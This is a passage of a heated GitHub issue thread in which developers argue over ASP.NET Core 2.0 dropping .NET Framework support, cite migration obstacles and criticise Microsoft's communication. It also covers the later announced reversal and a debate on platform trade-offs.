871	I'm afraid now, if it doesn't support full framework, we'd be me much trouble for our upcoming projects and [pact-net-core](https://github.com/garora/pact-net-core) is one of these.
872	No choice but to drop ASP.NET Core and MVC.  [Support Dropped For ASP.NET Core MVC](https://yetawf.com/BlogEntry/Title/Support%20Dropped%20For%20ASP%20NET%20Core%20MVC/?BlogEntry=1029)
873	And so we've arrived at the Vietnam of .NET. Bold move Microsoft, let's see if it pays off.
874	"> No choice but to drop ASP.NET Core and MVC. Support Dropped For ASP.NET Core MVC
@shanselman  Isn't it too early to decide this? Is there any public announcement/post saying this?"
875	I've done a couple new projects in ASP.NET Core 1.1 on the .NET Framework. Not thrilled that it's now a dead end. Wish I'd done them in old ASP.NET.
876	The Scotts are giving a talk to Build now, likely some news in or just after this talk. You can stream it live here: https://channel9.msdn.com/?wt.mc_id=build_hp
877	Thanks @NickCraver for sharing
878	"Tipical Microsoft.
After nearly 3-4 decades they could not develop decent browser.
nearly 2 decades - no framework with lifespan > 1 year with any future hope.
Thats it!.
 thumbs down as much, fact won't change."
879	"Disclaimer: I have read a lot but not _all_ of the 500+ comments above.

What annoys me is that MS keeps acting as if we should just upgrade and asks ""what holds you back?""

Damn, stop being delusional! 😡  .NET Core is not ready to replace .NET fx. Not today, not in a year!

Here's what holds **me** (my ASP.NET Core 1.1 project running on .NET fx) back:
- I need money and time to do the migration for zero business improvement. Really hard to get from management. 
- Lots of testing required... zero business improvement but real regression risks.
- We have to integrate with other enterprise services that expose **COM** api. I hate it but have no choice. @shanselman suggests creating an out of proc service on .NET fx and ""being in a world of pain."" Sorry, no, won't do that.
- **EF** is a major reason I'm still on fx. MS get your own stuff straight and then you'll talk to us about migration. EF Core is nowhere near ready to replace EF 6.
- **Oracle** DB provider doesn't support Core. Worse: they announced plans to port only their fully managed provider to Core, which has lots of limitations, e.g. no support for Oracle Advanced Queues.
- We use many **3rd party libraries**, some of which have migrated, some have not (yet or ever?).

@davidfowl 
Your comments make me feel like .NET fx is slowly becoming obsolete... So do you plan to never support HTTP/2 in fx?
I'm sorry but you need to port much of your work to .NET fx, that platform is not dead. What if I want to do HTTP/2 from a WPF app?
I don't care if improvements are delivered to .NET Core faster or if some non-critical improvements are Core only. But .NET Core is not replacing .NET fx any time soon.

What is MS guidance for building a web app today on .NET fx (as I clearly can't do it on .NET Core)?

It's not that I'm craving for new features (I don't), but I would like to be on a living platform, not a dead one. Something that is maintained and that gets necessary updates -- even if slowly."
880	"Also Microsoft, consider this:

**If ASP.NET Core 2.0 runs on .NET fx 5.0, this is an upgrade that I can, in time, organize.**
It does not matter when you ship .NET 5.0 -- even if it's much later than ASP.NET Core 2.0 -- and it does not matter how long it takes me to upgrade from .NET 4.6. _I have an upgrade path and a future._

**If ASP.NET Core 2.0 runs on .NET Core _only_, then I'm stuck in a dead-end.**
As much as I would like to, I can't see a migration from fx to core in the next _years_. See above for why."
881	"@Kukkimonsuta has one of the best summaries above.  In my case, the determinant for breaking ground on projects with Core-on-netfx was EF Core v EF6, along with other OSS toolsets that have not moved forward with `netstandard` compat.

One disturbing thing in this discussion has been @davidfowl and his respondents ""talking past"" each other: his response to the hew and cry is a bloodless ""okay, but what APIs do you really need?""  This is a commendable attempt to refocus the conversation, but he (more than likely unknowingly) is concealing a key problem.  His (and @shanselman 's) other response is that this is required to keep ASP.NET Core ""moving forward as fast as possible"".  Again a commendable goal, but again conceals a key problem.  (Both of the problems concealed tend to be the core ""concealed problems"" with OSS in general.)

This isn't a merely psychological/emotional issue, either, as @MisterGoodcat would contend in his attempt at bridging the divide.  @GiorgioG hit closer to the mark, with his contention that the ""uncertainty"" is something that ""big business"" doesn't like.

The problem, at root, is *cost*. Cost that's driven by uncertainty, and the cost of simply keeping up-to-date with an ever changing development landscape.  These don't just hit ""big business,"" they hit *every single developer*.  Maybe not in monetary terms (up front), but certainly in time, stress, and therefore the ability to swiftly and confidently execute solutions to (yes) business problems.

Let's consider again the challenge-response of ""**what missing APIs do you really need?**""  Tracing that question back through a sizeable project toolchain, and probably back into third-party libraries.  **Just answering this question is costly**, before even considering the cost of fixing it.

How about ""**moving forward as fast as possible**?""  Again, that's great, but with every ""move forward"" **there are costs to developers of having to keep up to date with changes**.  This affects us both in the learn/use differential that comes with the job, but also in the learning curve and expense of finding and training new talent.

Most troubling is the attitude of some that the ""edge-case"" of dependencies on older, un-portable libraries is not a problem worth consideration.  Granted, it's no place that anyone wants to be trapped, but **addressing technical debt isn't a cost that should be shouldered on a non-stakeholder's schedule**.

Now, while these costs aren't trivial, we all know and expect them in this line of work.  In fact, in terms of moving to .NET Core I think that most were expecting that even if we weren't forced into it, going that way would be the right thing to do.  The problems:

* Pushing this now collapses the ""amortization schedules"" (sometimes years-long) most of us were working with, both in terms of making the move actively, and in terms of addressing technical debt (un-portable code).
* The manner in which it is being pushed (""we're doing this for <s>our</s> your own good."") does not bode well for future stability: how do we know what future decisions will be made for us?

I was at the keynote in Vegas back when @shanselman pushed the button to open-source ASP.NET.  Since then, MS has only been moving toward OSS.  But this has always come with a question: along with the good of OSS, will the ""bad"" also creep into the Microsoft ethic?  Put another way, what are we losing in trade for what we're getting?  I think this is where we're starting to see it.

----
Another aside: I appreciate the idea from @markrendle, that this move will be a ""kick in the pants"" for every tool/library maintainer to actually move forward from `netfx`.  Two problems with that, though: first, a timeline would have been enough.  If there had been an announcement made of an N-year version cycle in which version M.0 would see the absorption of ASP.NET Core into .NET Core generally, that would have been enough of a ""stick"".  I would be one of the first to wield it against maintainers of tools I consume (so to speak).  Second, with this announcement, (and after taking a breath to see what the response to the negativity brings) tools that are focused particularly on ASP.NET (MVC or Core) will now most likely dispense with worrying about `netstandard` compat and just jump directly to .NET Core as well, further bifurcating the .NET landscape.

"
882	"FYI .NET Core 2.0 Preview is out:
https://www.microsoft.com/net/core/preview


"
883	"Reading through the Release Notes of Asp.net core preview I can't find anything on not supporting Full .Net framework.

It's already done in the bits, isn't it?"
884	"Welp, one of my fears confirmed.

Near direct quote from MS Build talk: ""70% of everything in NuGet are .NET Standard 2 API compatible... and the only ones that aren't are stuff like WinForms and WPF, because those don't exist on all the platforms.  But everything else is there.  No recompile.  Just works.""  

This is incredibly misleading."
885	"@PabloAlarcon This is the change you're looking for:

https://github.com/aspnet/Mvc/commit/1c5e4176069ea20671e1738ac599e544633f47ce

Dropping support for `net46` as a platform target, most project files have this:

```
-    <TargetFrameworks>net46;netstandard1.6</TargetFrameworks>
+    <TargetFramework>netcoreapp2.0</TargetFramework>
```

I think what most people wanted this change to be was:

```
-    <TargetFrameworks>net46;netstandard1.6</TargetFrameworks>
+    <TargetFramework>netstandard2.0</TargetFramework>
```"
886	Oh, thanks, but I meant on the release notes of the just published Preview 1 : https://github.com/dotnet/core/blob/master/release-notes/2.0/2.0.0-preview1.md
887	"@PabloAlarcon I think that's one of the bigger problems here was the complete lack of communication about this issue ahead of time, to the point that even speakers at Build right now are quoting misleading info/stats about the ecosystem.

They're all claiming most libs are `netstandard2.0` compatible, which means they should run everywhere (eventually) but this change actually means if your project even breathes in MVCs direction you can **ONLY** run it on .NET Core runtime."
888	"Those are the .NET Core 2 preview release notes, not the ASP.NET Core 2 preview release notes. This change would be here: https://github.com/aspnet/home/releases/2.0.0-preview1

And I guess it should be under known issues there and a list of breaking changes... but clicking the only link available there gives a github list with no results "
889	"My bad, I read both pages but copied the .net core one.

Still the same, no mention in sight."
890	"@marcrocny you worded much better why I thought the ""What libraries?"" question detracts from the real issue at hand than I could, so thanks. I don't need new and shiny pronto, I need new features in a reasonable timeframe and them being stable and, more importantly, be supported for awhile.

10 bucks says HTTP2 is never coming to full .Net.

"
891	Guess it's time for a community fork of ASP.Net Core.
892	Switching back to full .NET Framework and [NancyFX](http://nancyfx.org/) might be an option for a few depending on their reasons for switching to ASP.NET core in the first place.
893	"@dbus0 The problem is once you leave the sacred, blessed land of Microsoft's frameworks you wind up with a tiny ecosystem of libraries that support it (in comparison to ASP.NET)

If you're going to ditch ASP.NET for the web, you may be better off choosing a non-.NET tech stack IMO."
894	Can someone tell a list of features that aspnet core 2.0 make impossible ??
895	"Guys, you are killing the once-beautiful .NET framework. The linuxesque way you are managing the .NET   is only make everything look like a giant big hack. Everything in MS-dev is starting to look amateurish, disconnected, with every team/product going alone and on its own. Everything in BETA, everything InProgress, a big giant let's-try-and-see-what-happens, we joked, we promised not to do that yet..., do you really need that ? Why ? and so on. If we wanted things like those, we would have invested in PHP and Linux to have fun discussing how library X doesn't work with kernel Y because of package Z being incompatible so we need to rewrite all of our application just for fun. 

Plus, I hate when teams hide behind marketing mantras like ""moving faster"", ""explore the opportunities"" and the like that only hide business goals behind fake technical reasons. I even started seeing some ""this is open source - fix it yourself"" replies here and there in the eco-system. What I understand is that we cannot trust a lot of MS technologies anymore, especially .NET Core that has no idea where it is going and why. I was already very upset but the madness of incompatible versions and breaking changes at ANY level and status of development in .NET Core (ASP.NET Core changing everything at RC? Oh please...) but the fact, as both developer and a business user, is that I cannot recommend nor decide on behalf of my company to invest into Core just to start endless discussions about how Core 1.0 does not support that while Core 1.1 does but we cannot upgrade it because it breaks this or that yet we would like to upgrade to 2.0 because we need that new features that only 2.0 has and... what ? Are you kidding ?

And it doesn't matter if this kind of approach breaks something or to understand what namespaces or features people is actually using in order to introduce a new late-time change to support features people might want. You are short-circuiting things by the worst behaviour I saw, that is no earlier planning because we can just issue a new X.Y.Z release and tell people to upgrade. If they can't, for any reason, bad luck. We will ""support"" v1.0 even if we are working at v8.0 except that you will have none of v8.0 features so our support will basically consist in patting your back when you will complain and state that life is hard.

I can't believe how many MS technologies we dropped in last two years. I never thought we could do that since we've been a Microsoft shop since 1998. Heck, in our area we're always getting hired when it's ""a .NET thing"" or ""it's a Windows thing"" (no questions asked - it's Windows -> call them) but today when I have to choose a technology for a new project I always wonder if it's sane to stay with the .NET framework, generally speaking. And for sure, after reading this, all our investments into .NET Core will halt at least until we understand what's going on with that. We absolutely have no will nor time to explain our customers why we need to rewrite that or this because .NET Core 1.1 is not compatible with 2.0 or that we need to create a small separate project that someone will need to maintain just to host a library that we need but that is compatible with an ""old"" version of the framework where ""OLD"" means a version that's been released 3 months ago. And still we would need to upgrade because of the ""older"" versions that will be maintained (MAYBE) but will receive no new features.

You have to know that such approach is making us reconsider the .NET framework as a WHOLE and reconsidering .NET framework means reconsidering Windows. And reconsidering Windows means reconsidering if we need Microsoft at all. It's not up to us to scavenge GitHub or some obscure forum to understand what features will be supported in vNext and compare them with vCurrent to understand if we can start developing targetting a BETA or Alpha release in order to be compatible with vNext because we need that specific feature so developing using an older version makes no sense at this stage but it's our risk to develop targetting a release that's not final and that might (and will) change only to start this madness again after a couple of months. That is not ""agile"", that's being kids with lots of free time. 

I always knew that I would miss Gates but I never thought that I could miss Ballmer as well. Well done, guys.
"
896	In my opinion it's somehow too early to switch completly to .NET Core. Lots of 3rd party frameworks and libraries currently do not support .NET Core at the moment. Take NServiceBus as an example. Please support .NET Framework at least until ASP .NET Core 3...
897	"Official (related) announcement 
https://blogs.msdn.microsoft.com/webdev/2017/05/10/aspnet-2-preview-1/

> ## Preview 1 Issues
> This preview version of ASP.NET Core 2.0 ships with support for the .NET Core 2.0 SDK only.  **Our goal is to ship ASP.NET Core 2.0 on .NET Standard 2.0 so applications can run on .NET Core, Mono and .NET Framework.**  

> As the team was working through the last of their issues before Build, it was uncovered that the preview of ASP.NET Core 2.0 utilized API’s that were outside of .NET Standard 2.0, preventing it from running on .NET Framework. *Because of this we limited Preview 1 support .NET Core only so it would not break a developer upgrading an ASP.NET Core 1.x application to ASP.NET Core 2 preview on .NET Framework.*"
898	"Nice backpedaling there. 

So all the feedback and ""justification"" in this thread for dropping .NET Framework was just for a Preview?"
899	Notable that the change of heart wasn't announced here either...
900	"@benaadams 

> Our goal is to ship ASP.NET Core 2.0 on .NET Standard 2.0 so applications can run on .NET Core, Mono and .NET Framework.

""We've always been at war with Eastasia"""
901	"That's comforting but some comments above from official ASP.NET Core members delivered a _very_ different message.

I would like an official statement about the mid-term future of ASP.NET Core with respect to .NET framework please.

Is MS committed to maintain ASP.NET Core compatible with netstandard?
Not just the ASP.NET Core 2.0 release (not necessarily on 4.7)."
902	Talk about a head-a-splode situation here. Just what *is* going on? :thinking:
903	"> Nice backpedaling there.
>
> So all the feedback and ""justification"" in this thread for dropping .NET Framework was just for a Preview?

Hey, don't be a dick about this. They had a vision about what ASP.NET Core should be, lots of feedback has been given, and the feedback was listened to.

Thanks ASP.NET team 👍 "
904	"@davidfowl 

> When's the last time we changed string and array in .NET Framework?

[In .Net Framework 4.6, for both.](https://github.com/Microsoft/dotnet/blob/master/releases/net46/dotnet46-api-changes.md) That's one minor version behind the brand new .Net Framework 4.7 and less than two years ago.

I'm not sure string and array are as hard to change in .Net Framework as you make it sound.
"
905	"@JamesNK 

> lots of feedback has been given, and the feedback was listened to

Was it? At least some of the feedback was complaining about insufficient communication. Now we have people from MS saying one thing in this thread, a slightly more recent blog post saying another thing and no information about the change or what the future is.

I would expect at least someone from MS to show up in this thread and to say that they changed their mind for ASP.NET 2.0 and that dropping .Net Framework is still on table for a future version, but they will inform us as soon as they know more (or whatever the actual situation is)."
906	"> I would expect at least someone from MS to show up in this thread and to say that they changed their mind for ASP.NET 2.0 and that dropping .Net Framework is still on table for a future version, but they will inform us as soon as they know more (or whatever the actual situation is).

In their defense (and not that I think this was handled well at all), the whole team is pretty much at Build. I'm sure we'll hear something here soon-ish. Nobody's lives are going to change due to this decision in a few days."
907	"> Hey, don't be a dick about this.

I spent several hours today and yesterday with my team in pseudo-crisis mode discussing the impact and change in technical strategy that this would cause over the next 12 months for us, only to be told ""Oops our bad!"".

I welcome the change, and I am grateful that we were listened to. While I'm not trying to be a dick, I am  _pissed_ over the communication over this. "
908	"> We've identified strings as one of the major things we'd like to try tackling in .NET Core, there's tons of ideas but one of them is to have string be utf8 by default (tons of compat problems but follow me here).
Another thing we'd like to fix is the ability to take cheap slices of arrays/strings, any piece of contiguous memory. We've added Span<T> and are looking at Buffer<T> to represent this. It might mean that String and Array implement new interfaces that make it possible to take a slice that requires 0 allocation.
This leads to new methods on String that allow splitting that doesn't allocate an array every time.
This leads to overloads to Int, UInt etc (TryParse) that take Span<char> and Span<byte>.
This leads to new encoding routines that take Span<byte>.
Buffer<T> and Span<T> let you represent memory in a uniform way and we want to upgrade the networking stack to allow passing pre-pinned buffers that take Span<T> or Buffer<T>.
Kestrel will implement HTTP2 in the 2.x timeframe (currently aiming at 2.1) and that requires new APIs on SSL stream to do ALPN (https://en.wikipedia.org/wiki/Application-Layer_Protocol_Negotiation).
Http Client on .NET Core supports duplex streaming, it'll make it possible to implement streaming end points over http in signalr over a single, non websocket http request.
We forked the header parser implementations from HttpClient and System.Net.Http and renamed them (https://github.com/aspnet/HttpAbstractions/tree/d1d9bceff56cb44a194ae36923ce687e5e353006/src/Microsoft.Net.Http.Headers) so that we could improve them and have them support both .NET Framework and .NET Core. .NET Core has a copy of these improvements haven't made it back because there no need to improve them (we couldn't consume them).
There are a bunch new threading primitives that require new API that will light up new scenarios if we're able to consume them (https://github.com/dotnet/corefx/issues?q=is%3Aopen+is%3Aissue+author%3Adavidfowl+label%3Aarea-System.Threading), those are just some of the things I've personally filed.

RIP modern platform. If the asp.net core team received a solution from above."
909	"> I spent several hours today and yesterday with my team in pseudo-crisis mode discussing the impact and change in technical strategy that this would cause over the next 12 months for us, only to be told ""Oops our bad!"".
>
> I welcome the change, and I am grateful that we were listened to. While I'm not trying to be a dick, I am pissed over the communication over this.

You're upset that they listened to the community and (seemlying) changed course? You spending time on something that was never finalized is not the community nor Microsoft's fault."
910	Great news!
911	"I hope this doesn't mean we now miss out on utf8 strings by default and the other goodies talked about by @davidfowl (if running on .NET Core)
"
912	"Since the ""no .NET Desktop support for ASP.NET Core 2.0"" plan was finally cancelled, I think we can now close this thread (but don't hesitate to ping me if you want me to re-open it).

I'd like to thank everyone for taking the time to participate to this thread ; no doubt it helped make the Microsoft heads realize that they couldn't silently adopt such a major breaking change at the last minute without consulting their community or measuring the actual impact of their unilateral decisions on the entire ecosystem.

Even though we all had different opinions, the most important thing was to have a real discussion about this change. It's clearly a huge - and unprecedented - success (150 participants and more than 600 messages, woot!)

It's amazing to see such a great community in action, I'm so proud of being part of it :call_me_hand: "
913	"@davidfowl @DamianEdwards @shanselman Thank you. This makes my life a lot easier, and we can push through our plans to migrate without uncertainty now, as can so many more. I know this isn't ideal for the ASP.NET team, but I sincerely think it's the best move at this point in time for the growth of the platform.

And this thread was handled remarkably well, even with some less than productive comments. Very, very rarely do you see an issue with hundreds of comments contain anything useful after a while (@davidfowl, you're awesome).

I look forward to having this discussion with 3.0, when I hope the platform is to the point dropping support is a much easier option leaving drastically fewer users behind. I look forward to helping get it there."
914	This outcome seems fine. I'm sure we can put together a roadmap some time soon, with a plan to move everything to core - just, over a period of time with everyone knowing about it in advance :)
915	"Also wanted to leave my thoughts... It's great to see the ASP.NET team was able to swiftly course correct after listening to community feedback which I believe is the best strategy for a prosperous .NET future for both the .NET framework and ultimately adoption of .NET Core itself where I expect most adoption will come from existing .NET developers, many of which will be able to continue to migrate their existing code bases to ASP.NET's new development model.

I also don't fault that mistakes were made, especially when developing in the open, the important part is what we can learn from them. One of the biggest advantages of OSS is being able to get feedback early so you can make informed decisions about the best course for your project's future and its users, which I believe the ASP.NET team was able to do here. I hope it also reiterates just how important messaging is for both the direction, vision and roadmap for your project, how they form the basis for strategic decisions of early adopters and your most loyal stakeholders and how important it is to engage your community when proposing fundamental changes that can impact their existing and future investments in your platform.

Lastly of the 9 years I've been actively developing on Github this is the most active thread I've ever participated in with most comments able to remain thoughtful and courteous which bodes well for .NET's future showing just how many devs still care about .NET and are eager to adopt ASP .NET Core and follow MS into an exciting new multi-faceted future that .NET Standard and .NET Core will enable. Exciting times ahead!"
916	Thanks for listening Microsoft!
917	"@davidfowl @DamianEdwards @shanselman Thank you.
Thanks Microsoft"
918	Holly cow! What hot mess did I miss? Well whatever the outcome winds up being in the end, I just hope it strengthens and not weakens the dotnet ecosystem. I'm okay with trying to innovate and needing to cut off the past at some point, but those references to become the next Python 2 vs 3 are all too real. Even though I'm not personally affected with my own projects, I'm glad to see all the developer support here. All these people taking a strong interest in the product with detailed examples of how it affects them confirms just how strong this community is. Thanks everyone for caring and keeping this community alive!
919	"Well done to all!
Great news for OSS on .NET!!"
920	@davidfowl @DamianEdwards @shanselman Thank you for listening the the feedback. Also, thank you personally for starting the discussion within our organization about how we can work to target .NET Standard for improved platform portability. My hope is that we can find a way to target all of our libs shared between our WinForms application and ASP.NET Core application to .NET Standard 2.0 so that we can, in fact, run our ASP.NET Core products on .NET Core in the future.
921	"See you again at version 3.0?
"
922	"On a positive note: I am glad you decided to change this. Makes my life as a developer a lot easier and my justification for investing time and energy in learning and developing in .Net a good one.

So thanks."
923	"Well, I don't think dropping support for full netFx is a mistake. On the contrary, the only mistake is that the ASP.NET Core supported the full netFx at the very beginning.

In other words, ASP.Net Core should NEVER be able to support the full netFx. It should be a web framework which is specifically built for .Net Core.

ASP.Net Core is supposed to be on top of .Net Core which implements a certain version of .Net Standard, and it should have nothing to do with the full netFx. 

ASP.Net Core apps are able to run on whatever platforms/OSs as long as .Net Core can run on them. But it is just about the ability to run, not to support all the platform-specific features. If one really needs windows-specific features, he should use multiple-target nuget packages that support windows, or he should use ASP.Net instead.

So I think what the team's trying to do would've corrected the mistake. But unfortunately, you guys stop them successfully.

BTW, maybe changing ""ASP.Net Core"" to ""ASP for .Net Core"", and changing ""ASP.Net"" to ""ASP for .Net Framework"" would make sense of everything.  And what you guys require is actually sort of ""ASP.Net Standard"" or ""ASP for .Net Standard""."
924	"@davidfowl @DamianEdwards @shanselman  Also joining my voice to thanking you for the decision.

.NET Framework is very important to us and we will never move beyond it unless the libraries we depend on are there as well.

Thanks for listing to the community."
925	Welcome to true Open Source
926	Great news! :) I hope Microsoft now knows that trust in a reliable, dependable future is key for many of us and they won't make this mistake again soon. 
927	"I'm honestly not sure why you all already celebrate. The blog post contradicts the statements of Fowler and Edward in this issue, and they have not yet retracted their statements or corrected them. The blog post was written by Jeffrey, yet another person. In this issue it was mentioned that the drop of .NET support was a deliberate decision that was made. In the blog post they mention that the lack of support was ""uncovered"". There was no mention in the blog post that they changed their plans after the backslash from the community.

So there's still a lack of clarity for me. Contradicting statements by different members of the team.

@DamianEdwards @davidfowl: Could you please provide clarity regarding this issue?

@PinpointTownes: Perhaps you should re-open this issue, as it's not as clear as you think it is."
928	I'm with @MartinJohns. Does this mean ASP.NET Core does not profit from the fast-paced development of .NET Core @davidfowl talked about?
929	"I'm also on the sceptical side.  The vehicle has lurched back to be travelling in the right direction for the moment, but the evidence that the drivers are not properly on top of matters is stronger than ever.

The inconsistency between what's going on here, what's going on in the press releases / blogs and what we must all infer is going on internally is horrible.  Out here in customer land, we're trying to make a decision about trusting MS with our business for the next X years, and this is a shocking way to go about trying to earn trust.

Look at the history:
* Bad decision made in secret (bad)
* Somewhat obnoxious attempt to justify it (somewhat good, somewhat bad)
* Reversal of bad decision (good)
* Attempt to gloss over the first three steps (appalling)

It's a pity that Build is such an overly-glossy wankfest, because the sensible thing to have done in the two Scotts' show yesterday would have been to throw away the powerpoint, put the half dozen senior .NET people on plastic chairs in the middle of the stage and take the shit manfully while explaining their position reasonably.

Instead they completely ignored the elephant raging around the room and are now apparently trying to pretend nothing ever happened in the first place.

The bad decisions and the reversals are a natural part of the development process and with OSS you get to see them - that's fine.  The corporate cover-up is not.

.NET is a tool for MS to sell Azure, which is a proposition that requires even greater long-term trust than just choosing a dev framework.  How's that trust-building going this week?
"
930	I second @MartinJohns here: they couldn't target netstandard2.0 as the sky would fall otherwise, and now they can. (Of course they can, there's no technical reason for not being able to, but according to @davidfowl  and @DamianEdwards it was needed). **How** are they now going to do this, what has been decided now? I know it's //build and all, but they aren't that understaffed that no-one can come to this thread and explain things a bit. Or do we all have to message our favorite Microsoft employee and ask via backchannels? I truly hope not. 
931	"> the sensible thing to have done in the two Scotts' show yesterday would have been to throw away the powerpoint, put the half dozen senior .NET people on plastic chairs in the middle of the stage and take the shit manfully while explaining their position reasonably.

@willdean The vast majority of the people watching the Build keynote or Scott²'s session had no clue about this going on in the first place. It's perfectly understandable that they didn't want to drag this mishap into the light, leaving hundreds of thousands of devs just as confused as this thread if it was just a mistake and they'd decided to do go back on the decision anyway.

Let's give the team some slack and hope for a good explanation/postmortem after Build :smile:"
932	"> The vast majority of the people watching the Build keynote or Scott²'s session had no clue about this going on in the first place. 

That's a fair point."
933	"@FransBouma They can support netstandard2.0, but it will be painful in terms of polyfills, cross compiles and extra code. Some features might also be practically impossible to implement until certain new features are in place, like http2.

But it's not impossible. It's just a lot of extra work that everyone would rather not do.

The whole core ecosystem is a balancing act between innovation and legacy support. We need enough legacy support to eventually have most stuff on core, but enough innovation to make core an attractive platform.

I hope for a good postmortem, but it's enough to address it here. Posting a blog post would just confuse the 99% that didn't know this was ever an issue."
934	"@hallatore  ""It's just a lot of extra work that everyone would rather not do.""
I feel you. I personally would rather start green tomorrow but nobody is giving ""me"" that option ... because you know, reality ...

Let's not forget that ASP.Net is an ""ecosystem"" with CMSes, 3rd party libraries, components, software built over a 17 years lifespan. You can't just drop the ball on your ecosystem and community and say we really want to use fancy strings even if it means leaving you all behind ... you ""just can't"" ... it's the worst you could do to a supporting community. 

Want to take advantage of advancements, then by all means, build platform specific code paths and take advantage. This way over time the user base will switch to take advantage of platform differences. But in under no circumstances is ignoring the ""needs"" of large part of your ecosystem a wise option. 
"
935	"@hallatore 
> They can support netstandard2.0, but it will be painful in terms of polyfills, cross compiles and extra code. Some features might also be practically impossible to implement until certain new features are in place, like http2.

Nah. It's just code, C#, written and then run. I seriously had to laugh when I read the list of things they apparently can't do on .net full and had to do the break with .net full because of it. It's just politics. We outsiders have to write very fast code on .NET full, have to deal with these api's and have to make the best of it. We do that. We solve the same problems they have to work with too. So can they. They just don't **want to** do that. But frankly I'm too old and have dealt with Microsoft soaps too many times to take that seriously anymore. Let them keep the internal politics in Redmond and don't let the users (us!) suffer because of it. As we already have done that many times before, mind you. 

> I hope fore a good postmortem, but it's enough to address it here. Posting a blog post would just confuse the 99% that didn't know this was ever an issue.

Yeah a blog post is not the right place. This thread is the perfect place for how they're going to solve it now. "
936	"@FransBouma 

Core contains a lot of new features that was made because of the research put into asp.net core and kestrel. It's not the C#, it's that the code uses stuff which doesn't exist in full framework.

As @davidfowl said. They have polyfills for most of the current stuff. But they are starting to see stuff they cannot even polyfill. Which means they most likely need to either drop stuff or make changes to the full framework. And the work required getting new features into full framework vs core are huge, and have a much longer time frame.

And then we are back to the balancing act. Should we limit core because of full framework, or should core be able to innovate at a higher pace than what asp.net ever could?

I understand very well why they wanted to only support core. And from a purely tech perspective supporting full framework adds a ton of stuff they now need to account for. But the ecosystem and community is not ready for core only (as we clearly see), and the price for that is a more complex asp.net core development."
937	"@hallatore If you want to break compatibility you announce it ahead of time and announce a migration path. One way or another you invest giving your users a migration path.

This is more or less the price of having users, and having users it is not an annoyance, it's a responsibility.

I don't think we are debating whether or not it's more work to support more platforms. It is. The cost is higher the code paths are more complicated, etc, etc. Can you get rid of this cost and chose single platform ? Well most of the answers here, meaning the voice of community, say that not at this time, the ecosystem is not ready. Which means the responsible thing to do find a middle ground solution of a sort.

"
938	"@hallatore 
> Core contains a lot of new features that was made because of the research put into asp.net core and kestrel. It's not the C#, it's that the code uses stuff which doesn't exist in full framework.

Well, then port it over. They own both, I don't see why there is *any* problem. Mind you: they can port the code over by simply creating a netstandard2.0 library, or even better: create shim that targets the faster implementation in .net core and a slower implementation in .net full (with e.g. a lib from nuget). 

I generate IL at runtime to get superfast projections from datareaders in my ORM. I don't throw my hands in the air 'can't be done!', as no-one will solve it for me. I bet you have had similar issues where you simply had to dig in and make it work as no-one else would pick up the tab. They now have to do that too. 

> They have polyfills for most of the current stuff. But they are starting to see stuff they cannot even polyfill. Which means they most likely need to either drop stuff or make changes to the full framework. And the work required getting new features into full framework vs core are huge, and have a much longer time frame.

Sorry, but what things can't they 'polyfill'? Yes, they have made a terrible mess on .NET full and performance is terrible at places and to make things perform like the competition they have to make tough choices. Well, solve it. And not in some corner, but solve the core problem: On java they could solve it too, their performance is amazing, and they did that by not breaking any core API nor by creating a second platform. It's just software: keep the interface the same, solve the back end. Yes it's a lot of work, but do you think making e.g. an ORM fast is done overnight? :) Or making a webservice perform well so it can run the critical business logic for a large corp? No, it takes effort. And that's OK. 

The real elephant in the room here is .NET full and how it's managed. Or better: the lack of management there. I know they can't introduce breaking changes. Well, then introduce changes which don't break. If you look at Win32, they've never introduced any breaking change. Stuff simply works. Yes, things grow and the group of people who would rather cut everything out will grow by the day but that's irrelevant: we all deal with software which has parts which were once important and now not so much but we can't leave them behind/cut them out nor change them, as it will break people's code. 

> And then we are back to the balancing act. Should we limit core because of full framework, or should core be able to innovate at a higher pace than what asp.net ever could?

It has been mentioned a couple of times, but I don't see why you can't innovate on the full framework with the same speed. We all have to innovate our own software on .net full. I get that there are bottlenecks in e.g. string support, but if you need a no-copying string, then create one and move on. Yes you can bikeshed for the next ten years how ugly it is, or you can introduce that class, build your fast stuff on it and make progress. I've been doing fair share of C++/x64 assembler on win32 lately and if you see how many times they redefined strings there and apparently no-one bets an eye, we on .net will be *totally fine*. I mean, we already have two string types (array of char and string). 

> I understand very well why they wanted to only support core. And from a purely tech perspective supporting full framework adds a ton of stuff they now need to account for. But the ecosystem and community is not ready for core only (as we clearly see), and the price for that is a more complex asp.net core development.

Believe it or not, I too fully see their point why they want to break away from .NET full. I mean, my own runtime/API is 14 years old at places, I too want to break way from some parts of it *yesterday*. However I've also learned that I can't, for the simple fact my customers will be hurt by that and that's bad for them and for me. When you create a platform / runtime / API, you have to take into account that after the first release you do, you are on a path you can't get off of: your API is from that moment on set in stone. You can deprecate the crap out of it, but you can't remove things so users of it will break. Angular 1.x->2.x, python 2.x->3.x, Examples enough. "
939	"You can't package changes to BCL primitives in a netstandard package. If you want to change System.String and System.Int32, you need a different BCL.

And you can't innovate on the full framework with the same speed because every update to full framework is an in-place update over the version before, with billions of lines of code in the wild depending on every possible combination of features (including undocumented features). The reason you can innovate faster on .NET Core is that you can have applications targeting all the different versions of .NET Core all running isolated on the same server, each with their own copy of the runtime. That's the whole point of it. They built it so they could iterate faster. Now they want to take advantage of being able to iterate faster.

Personally I think the mistake was supporting full .NET from ASP.NET Core in the first place. It should have been a clean break right from the start."
940	"> Personally I think the mistake was supporting full .NET from ASP.NET Core in the first place. 

Honestly, they needed to 2.0 tooling and the compat shim to even make this remotely feasible, so IMO, this is the earliest they could've done it. Delaying just lets people delay conversions, and delay yelling at Microsoft about how they hate their users. You know whenever they do this -- with whatever kind of warning -- people will lose their fucking minds over it.

Frankly, the majority of this thread makes me very sad for the .NET community."
941	"> You can't package changes to BCL primitives in a netstandard package. If you want to change System.String and System.Int32, you need a different BCL.

Yes, I know and that's not what I implied to say. I see some people misinterpreted my post in that light, but that's not what I intended. If I may, I'd like to give an example which is on topic here: inside my ORM I use string concatenation too, for creating query strings. This is a huge overhead, for every ORM. Using the default string class for that is helpful to a point but it gets ugly with all the copying. So I introduced specific classes which mitigate that copying to a great deal or avoid it at all. This has downsides, as you can't use them where a string type would suffice nor can you use them with all the APIs that take a string instance. However you _can_ use them where you yourself need them the most: on the hotpath through your own code. 

This isn't ideal _by far_, and if one can avoid this, obviously one should. However life's messy and the things we release stay there forever. You can't change things that are already out, so you have to deal _with that situation_, and one of the solutions for that is by introducing new types and new code working with these types. This approach is used in all major OS APIs for many years and while it sucks as it's butt ugly, it's a proven method to move forward instead of staying in a deadlocked past. "
